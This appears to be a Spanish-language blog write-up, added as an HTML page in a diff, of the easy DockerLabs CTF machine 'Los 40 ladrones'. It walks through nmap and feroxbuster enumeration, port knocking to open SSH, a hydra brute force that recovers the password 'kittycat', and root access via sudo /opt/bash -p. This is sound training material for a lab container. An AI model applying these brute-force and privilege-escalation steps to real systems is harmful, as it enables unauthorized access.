@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | Los 40 ladrones</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg
+      stroke="currentColor"
+      fill="currentColor"
+      stroke-width="0"
+      viewBox="0 0 16 16"
+      height="1.2em"
+      width="1.2em"
+      xmlns="http://www.w3.org/2000/svg"
+    >
+      <path
+        d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"
+      ></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Los 40 ladrones</h2>
+          <small class="date">04 Jul 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">dockerlabs</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">facil</a>
+            
+          </div>
+        </div>
+        <div class="content"><p><img src="/assets/images/los40/lis40.jpg" alt="image" />
+Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Vemos que solo tiene el puerto <strong>80</strong> abierto. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+</code></pre></div></div>
+
+<p>Vemos que la web es una página por defecto de la instalación de apache. Buscamos directorios y ficheros en el servidor con <strong>feroxbuster</strong>. Buscamos las extensiones <strong>php</strong>, <strong>html</strong> y <strong>txt</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-u</span> http://172.17.0.2 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-r</span> <span class="nt">-d</span> 2 <span class="nt">-x</span> php,html,txt
+200      GET      367l      977w    10792c http://172.17.0.2/index.html
+200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
+200      GET      367l      977w    10792c http://172.17.0.2/200      GET        3l       20w      111c http://172.17.0.2/qdefense.txt
+</code></pre></div></div>
+
+<p>Encontramos un fichero llamado <strong>qdefense.txt</strong>. Lo descargamos y leemos su contenido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://172.17.0.2/qdefense.txt
+Recuerda llama antes de entrar , no seas como toctoc el maleducado
+7000 8000 9000
+busca y llama +54 2933574639
+</code></pre></div></div>
+
+<p>De el fichero obtenemos que hay un user llamado <strong>toctoc</strong> y una secuencia de números que puede ser una secuencia de <strong>Port Knocking.</strong>  El port knocking es un mecanismo para abrir puertos externamente en un firewall mediante una secuencia preestablecida de intentos de conexión a puertos que se encuentran cerrados. Una vez que el firewall recibe una secuencia de conexión correcta, sus reglas son modificadas para permitir al host que realizó los intentos conectarse a un puerto específico.</p>
+
+<p>Para instalar en kali el comando knock realizamos lo siguiente: <code class="language-plaintext highlighter-rouge">sudo apt update &amp;&amp; sudo apt install -y knockd</code></p>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Después golpeamos los puertos en la secuencia que hemos visto:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>knock <span class="nt">-v</span> 172.17.0.2 7000 8000 9000
+hitting tcp 172.17.0.2:7000
+hitting tcp 172.17.0.2:8000
+hitting tcp 172.17.0.2:9000
+</code></pre></div></div>
+
+<p>Realizamos un nuevo escaneo de puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Ahora ya tenemos el puerto <strong>22</strong> abierto. Como tenemos un user del sistema vamos a probar a buscar la contraseña de dicho usuario con <strong>hydra</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> toctoc <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="nt">-t</span> 16 <span class="nt">-VIf</span> ssh://172.17.0.2
+...
+826 of 14344401 <span class="o">[</span>child 12] <span class="o">(</span>0/2<span class="o">)</span>
+<span class="o">[</span>22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
+<span class="o">[</span>STATUS] attack finished <span class="k">for </span>172.17.0.2 <span class="o">(</span>valid pair found<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Nos conectamos con la password recién encontrada:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh toctoc@172.17.0.2                 
+toctoc@172.17.0.2<span class="s1">'s password: 
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)
+</span></code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vemos si el usuario toctoc puede ejecutar algún comando como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>toctoc on 50a589993c7e:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+    use_pty
+
+User toctoc may run the following commands on 50a589993c7e:
+    <span class="o">(</span>ALL : NOPASSWD<span class="o">)</span> /opt/bash
+    <span class="o">(</span>ALL : NOPASSWD<span class="o">)</span> /ahora/noesta/function
+toctoc@50a589993c7e:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Puede ejecutar /opt/bash como root. Como sabemos ejecutando <code class="language-plaintext highlighter-rouge">/opt/bash -p</code> podemos obtener acceso como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>toctoc@50a589993c7e:~<span class="nv">$ </span><span class="nb">sudo</span> /opt/bash <span class="nt">-p</span>
+root@50a589993c7e:/home/toctoc# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">date
+</span>root
+50a589993c7e
+Fri Jul  5 08:20:09 +10 2024
+</code></pre></div></div>
+</div>
+      </section>
+      <footer>
+  <p>&copy; 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
